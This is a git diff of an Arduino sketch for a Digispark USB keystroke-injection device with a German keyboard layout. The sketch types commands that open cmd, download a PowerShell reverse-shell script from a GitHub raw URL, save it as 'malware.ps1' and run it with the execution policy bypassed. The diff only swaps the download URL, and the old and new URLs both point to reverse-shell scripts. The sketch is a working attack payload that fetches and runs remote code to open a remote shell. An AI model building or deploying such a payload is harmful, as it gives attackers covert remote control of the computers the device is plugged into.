@@ -7,7 +7,7 @@ void setup() {
   DigiKeyboardDe.println("cmd");
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
   DigiKeyboardDe.delay(500);
-  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell wget 'https://raw.githubusercontent.com/GitSimonVetter/test/refs/heads/main/Client-Side-Script-ReversePowershell.ps1' -OutFile malware.ps1");
+  DigiKeyboardDe.println("cd / & mkdir win & cd /win & powershell wget 'https://raw.githubusercontent.com/GitSimonVetter/GFS_Frenzen/refs/heads/main/Commad/1_Befehl%20bestehende%20Connection/Linux-Smart-Client-Side-Script-ReverseShell.ps1' -OutFile malware.ps1");
   DigiKeyboardDe.delay(500);
   DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
   DigiKeyboardDe.println("powershell -ExecutionPolicy ByPass -File malware.ps1");
